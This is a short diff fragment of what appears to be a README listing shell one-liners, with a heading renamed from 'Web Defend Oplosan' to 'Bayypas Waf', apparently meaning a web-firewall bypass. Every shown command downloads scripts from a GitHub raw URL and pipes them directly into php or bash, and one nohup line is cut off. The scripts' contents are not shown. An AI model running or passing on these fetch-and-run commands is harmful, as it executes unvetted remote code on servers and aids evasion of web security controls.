@@ -54,8 +54,7 @@ nohup curl -s https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/putus.sh | bash
 ```
 
-```
-# Web Defend Oplosan
+# Bayypas Waf
 ```
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/ch.php | php && curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/glandang | php && curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/putus.sh | bash
 ```
